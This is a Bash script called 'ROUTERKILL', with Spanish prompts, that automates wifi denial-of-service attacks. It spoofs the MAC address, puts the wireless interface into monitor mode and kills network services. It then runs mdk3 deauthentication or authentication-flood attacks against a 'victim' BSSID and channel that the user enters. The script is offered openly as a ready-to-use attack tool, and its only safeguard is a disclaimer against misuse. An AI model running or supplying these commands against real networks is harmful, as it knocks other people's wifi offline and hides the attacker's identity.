#!/bin/bash
#Author: https://github.com/hackingconh
#Instagram: @hacking.con.h
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
mon="mon"


#logo
clear	
	echo -e "$blue" 
echo "			                                █████                       █████       ███  ████  ████ "
echo "			                               ░░███                       ░░███       ░░░  ░░███ ░░███ "
echo "			 ████████   ██████  █████ ████ ███████    ██████  ████████  ░███ █████ ████  ░███  ░███ "
echo "			░░███░░███ ███░░███░░███ ░███ ░░░███░    ███░░███░░███░░███ ░███░░███ ░░███  ░███  ░███ "
echo "			 ░███ ░░░ ░███ ░███ ░███ ░███   ░███    ░███████  ░███ ░░░  ░██████░   ░███  ░███  ░███ "
echo "			 ░███     ░███ ░███ ░███ ░███   ░███ ███░███░░░   ░███      ░███░░███  ░███  ░███  ░███ "
echo "			█████    ░░██████  ░░████████  ░░█████ ░░██████  █████     ████ █████ █████ █████ █████ "
echo "			░░░░░      ░░░░░░    ░░░░░░░░    ░░░░░   ░░░░░░  ░░░░░     ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░ "
	echo -e "$red"
echo " 								 ROUTERKILL"
echo "							     by @Hacking.con.H"

#root privilegies
if [[ $EUID -ne 0 ]]; then	
	echo "														         "
	echo " 			(✗) No eres usuario root, para ejecutar la heramienta tienes que ejecutarla siendo root (✗)      "				  
	echo "				(✗) You are not a root user, to run the tool you have to run it as root (✗)              "		
        	exit 1
fi
#git
if which git >/dev/null; then
                sleep 0.25
         echo -e "$blue(GIT)$nc .......................................................... Instalado [$green✓$nc]"
                sleep 0.25
else
                sleep 0.25
         echo -e "$red(GIT)$nc No instalado [$red✗$nc]"
                        sleep 1
#instalación mensaje
         echo "Instala [ GIT ] escribiendo : sudo apt-get install git"
                exit 1
fi
#airmon-ng
if which airmon-ng >/dev/null; then
		sleep 0.25
         echo -e "$blue(AIRMONG-NG)$nc ................................................... Instalado [$green✓$nc]"
else
		sleep 0.25
	 echo -e "$red(AIRMONG-NG)$nc No instalado [$red✗$nc]"
			sleep 1
#instalación mensaje
         echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
		sleep 0.25
fi
#airodump-ng
if which airodump-ng >/dev/null; then
		sleep 0.25
         echo -e "$blue(AIRODUMP-NG)$nc .................................................. Instalado [$green✓$nc]"
else
		sleep 0.25
	 echo -e "$red(AIRODUMP-NG)$nc No instalado [$red✗$nc]"
			sleep 1
#instalación mensaje
         echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
fi

#mdk3
if which mdk3 >/dev/null; then
		sleep 0.25
         echo -e "$blue(MDK3)$nc ......................................................... Instalado [$green✓$nc]"
		sleep 0.25
else
		sleep 0.25
	 echo -e "$red(MDK3)$nc  No instalado [$red✗$nc]"
			sleep 1
	 echo "Clona y instala Mdk3 en [https://github.com/wi-fi-analyzer/mdk3-master]."
		exit 1
fi
#macchanger
if which mdk3 >/dev/null; then
		sleep 0.25
         echo -e "$blue(MACCHANGER)$nc ................................................... Instalado [$green✓$nc]"
		sleep 0.25
else
		sleep 0.25
	 echo -e "$red(macchanger)$nc  No instalado [$red✗$nc]"
			sleep 1
	 echo "Instala escribiendo [sudo apt-get install macchanger]."
		exit 1
fi
clear
#notice
	echo -e "$red"
      echo "                              ######### 				"                                  
      echo "                            *####   ####                            "     
      echo "                           ####,     (####                          "      
      echo "                         .####         ####                         "      
      echo "                        ####*           #####                       "      
      echo "                       ####               ####                      "      
      echo "                     ####(      &@@@%      ####(                    "      
      echo "                    ####        &@@@@       .####                   "      
      echo "                  #####         @@&@%         ####*                 "      
      echo "                 ####           %@@&,          ,####                "      
      echo "               /###%            .@@@             ####.              "      
      echo "              ####.              @@&              *####             "      
      echo "            ,####                                   ####.           "      
      echo "           ####,                 /@.                 (####          "      
      echo "         .####                  &@@&@                  ####         "      
      echo "        ####/                                           #####       "      
      echo "        ###,                                             ####       "      
      echo "        ####################################################*       "      
      echo "           ###############################################          "
                                                                                






	echo -e "$red NOTICE: $nc $yellow No me hago responsable del mal uso que hagas$nc"
		sleep 2.10


	echo -e "$red NOTICE: $nc $yellow I am not responsible for the misuse you make$nc"
		sleep 2.10
clear

#logo2
	echo -e "$green"
echo "                     @@@@@@@@@@@                @@    " 
echo "                     @    (@  @@                      "
echo "                     @@@@@@@@@@@               .@@    "
echo "                  %%%%%%%%%%%%%%%%*            %%%%   "
echo "                  @@@&        ,@@@@                   "
echo "                  @@@@@&    ,@@@@@/                   " 
echo "                   (@@@@@@@@@@@@@              @@@@   "
echo "                  % @@@@@@@@@@@@  @            @@@@   "
echo "                  @ ,@@@@   @@@@ *@            ####   "
echo "                  @  @@@@@@@@@@@ &@            @@@@   "
echo "                  @  @  @@@@@ @@ @@            @@@@   "
echo "                  @  @%       @@ #@            @@@@   "
echo "                  @ %@@/     @@@ .@            @@@@   "
echo "                  @  @@@@@@/ @# @ @@ %( %  @(@@@@@@   "
echo "                  @@ @@@   @@  @. @@ @@  %%% @@@@@@   "
echo "                  @@@# /@@@@@  @@@@                   "
echo "                  @@@@@@#. *@@@@@@                    "
	echo -e "$red"
echo " 		       routerkill   "
echo "		     @Hacking.con.H "	
	echo -e "$blue"
echo "	     ⟻------------⤫------------⟼		"
echo "		SELECCIONA TU INTERFAZ			"
echo "	     ⟻------------⤫------------⟼		"

#interfaz
	echo -e "$green"
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
	echo -e "$white"
	read -p "Pon tu interfaz ➜ " interface
#cambio de dirección mac
ifconfig $interface down
	echo -e "$Purple"
echo "¡¡FALSIFICANDO TU DIRECCION MAC!!"
macchanger -r $interface
ifconfig $interface up
#modo monitor y matando procesos
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
sleep 0.40
clear
#logo3
	echo -e "$purple"
echo "                                     ,*(#(*.			"                                    
echo "                               .&%*           (%#                 "             
echo "                             .#    /%%#((#%%%,   .#               "              
echo "                       %(       (%      .     ,%        %/        "              
echo "                       /%          #%.     /%,         /%         "              
echo "                        %#             %%%             %#         "              
echo "                        #%             %%#            (%,         "              
echo "                        ,%#                           %%          "              
echo "                         %%                          (%(          "              
echo "                         (%%                         %%.          "              
echo "                         .%%.                       (%%           "              
echo "                          &%%                       %%,           "              
echo "                    /######(((##(##################(((######.     "              
echo "                    %%%*,(#%%(,*%%%%,,%%%%/,*%%%%,,#%%%*,/%%,     "              
echo "                    %%%,.(%%%(,,%%%%,,#%%%*.*%%%#,.%%%%*./%%,     "              
echo "                    (%%%&&%&&&&&&&&%&&&&&&&%%%&&&&&&&&%%%&&%.     "              
echo "                     ......                          ......       "              
sleep 0.10
	echo -e "$red"
echo " 				   routerkill   "
echo "				 @Hacking.con.H "
	echo -e "$yellow"
echo "	                    ⟻----------⤫----------⟼			"
echo "			   	SELECT THE ATTACK			"
echo "			    ⟻----------⤫----------⟼			"

#menu
echo "
Selecciona un ataque:
    1. Dejar sin conexion a un wifi
    2. Añadir clientes a un wifi
    0. Salir
"
read -p "Introduce tu opción [0-2] > "

if [[ $REPLY =~ ^[0-2]$ ]]; then
    if [[ $REPLY == 0 ]]; then
        echo "Bye."
airmon-ng stop $interface$mon
clear
	exit
    fi
    if [[ $REPLY == 1 ]]; then
airodump-ng $interface$mon

#variables ataque 1
	echo -e "$green"
	read -p "añade el BSSID victima ➜ " bssid
	echo -e "$white"
echo -e "$bssid" [$green✓$nc]
	echo -e "$green"
	read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
echo -e "$nc"
	echo $bssid > $doc
echo -e "$green"
	read -p "añade el CANAL de BSSID victima ➜ " ch
	echo -e "$white"
echo -e "$ch" [$green✓$nc]
	echo -e "$green"

echo -e "$Purple"
echo "*-*-*-*-*-*-*-*-*-*-*-*-  "
echo "   CORRIENDO ATAQUE 	"
echo "*-*-*-*-*-*-*-*-*-*-*-*-	"
mdk3 $interface$mon d -b $doc -c $ch

    fi
    if [[ $REPLY == 2 ]]; then
airodump-ng $interface$mon

#variables ataque 2
	echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
	echo -e "$white"
	echo -e "$bssid" [$green✓$nc]
	echo -e "$green"
read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
	echo -e "$nc"
	echo $bssid > $doc
	echo -e "$green"
read -p "añade el CANAL de BSSID victima ➜ " ch
	echo -e "$white"
	echo -e "$ch" [$green✓$nc]
	echo -e "$green"
read -p "añade el ESSID victima ➜ " essid
	echo -e "$white"
	echo -e "$essid" [$green✓$nc]

echo -e "$nc" 
echo -e "$Purple"
echo "*-*-*-*-*-*-*-*-*-*-*-*-	"
echo "   CORRIENDO ATAQUE 	"
echo "*-*-*-*-*-*-*-*-*-*-*-*-	"
mdk3 $interface$mon a -a $doc; bash
echo -e "$nc"

    fi
else
    echo "Entrada incorrecta." >&2
    exit 1
fi
                                                                 
